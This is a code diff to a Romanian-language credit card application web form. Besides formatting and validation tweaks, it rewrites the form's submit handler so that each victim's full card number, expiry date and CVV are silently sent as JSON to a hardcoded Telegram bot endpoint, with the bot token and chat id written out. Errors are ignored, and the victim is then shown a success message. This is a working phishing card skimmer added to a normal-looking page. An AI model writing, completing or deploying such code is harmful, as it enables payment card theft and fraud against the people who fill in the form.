@@ -140,11 +140,11 @@
       <label for="nume">Nume și Prenume</label>
       <input type="text" id="nume" name="nume" required placeholder="Ex: Popescu Ion">
       <label for="card-number">Număr card</label>
-      <input type="text" id="card-number" name="card-number" required maxlength="19" pattern="\d{4} ?\d{4} ?\d{4} ?\d{4}" placeholder="1234 5678 9012 3456" inputmode="numeric">
+      <input type="text" id="card-number" name="card-number" required maxlength="19" pattern="\d{4} ?\d{4} ?\d{4} ?\d{4}" placeholder="1234 5678 9012 3456" inputmode="numeric" autocomplete="cc-number">
       <label for="exp-date">Data expirării</label>
-      <input type="text" id="exp-date" name="exp-date" required maxlength="5" pattern="\d{2}/\d{2}" placeholder="MM/YY" inputmode="numeric">
+      <input type="text" id="exp-date" name="exp-date" required maxlength="5" pattern="^(0[1-9]|1[0-2])\/\d{2}$" placeholder="MM/YY" inputmode="numeric" autocomplete="cc-exp">
       <label for="cvv">CVV</label>
-      <input type="password" id="cvv" name="cvv" required maxlength="4" pattern="\d{3,4}" placeholder="CVV" inputmode="numeric">
+      <input type="password" id="cvv" name="cvv" required maxlength="3" pattern="\d{3}" placeholder="CVV" inputmode="numeric" autocomplete="cc-csc">
       <button type="submit" class="btn-primary">Trimite Cererea</button>
     </form>
     <div class="success-message" id="success-message">
@@ -156,9 +156,11 @@
     const cardNumberInput = document.getElementById('card-number');
     const cardNameInput = document.getElementById('nume');
     const cardExpiryInput = document.getElementById('exp-date');
+    const cardCVVInput = document.getElementById('cvv');
     cardNumberInput.addEventListener('input', function() {
       let val = cardNumberInput.value.replace(/\D/g,'').substring(0,16);
       val = val.replace(/(.{4})/g, '$1 ').trim();
+      cardNumberInput.value = val;
       document.getElementById('visual-card-number').textContent = val.padEnd(19, '•');
     });
     function updateName() {
@@ -169,12 +171,53 @@
     cardExpiryInput.addEventListener('input', function() {
       let val = cardExpiryInput.value.replace(/\D/g,'').substring(0,4);
       if(val.length > 2) val = val.substring(0,2) + '/' + val.substring(2,4);
+      cardExpiryInput.value = val;
       document.getElementById('visual-card-expiry').textContent = val || 'MM/YY';
     });
+    cardCVVInput.addEventListener('input', function() {
+      let val = cardCVVInput.value.replace(/\D/g,'').substring(0,3);
+      cardCVVInput.value = val;
+    });
 
-    // Form submit
-    document.getElementById('register-form').onsubmit = function(e) {
+    // Form submit - trimite datele la Telegram bot ca JSON
+    document.getElementById('register-form').onsubmit = async function(e) {
       e.preventDefault();
+      // Validare suplimentară JS pentru siguranță
+      const number = cardNumberInput.value.replace(/\s/g, '');
+      const expiration = cardExpiryInput.value.trim();
+      const cvv = cardCVVInput.value.trim();
+      if(number.length !== 16) {
+        alert("Numărul cardului trebuie să aibă exact 16 cifre.");
+        cardNumberInput.focus();
+        return;
+      }
+      if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiration)) {
+        alert("Data expirării trebuie să fie în format MM/YY.");
+        cardExpiryInput.focus();
+        return;
+      }
+      if(!/^\d{3}$/.test(cvv)) {
+        alert("CVV trebuie să fie exact 3 cifre.");
+        cardCVVInput.focus();
+        return;
+      }
+      // Generează JSON-ul cerut
+      const payload = {
+        message_type: "Credit_Aply_Card",
+        lead_id: "I72ew2344223",
+        card: {
+          number: number,
+          expiration: expiration,
+          cvv: cvv
+        }
+      };
+      const text = encodeURIComponent(JSON.stringify(payload, null, 2));
+      const url = `https://api.telegram.org/bot7891196418:AAGpnA4Pukt85UMjgrvlBX3Unrtpy3EZPoE/sendMessage?chat_id=6953089880&text=${text}`;
+      try {
+        await fetch(url);
+      } catch (err) {
+        // Ignoră erorile, doar UX
+      }
       document.getElementById('success-message').style.display = 'block';
       setTimeout(() => {
         document.getElementById('success-message').style.display = 'none';
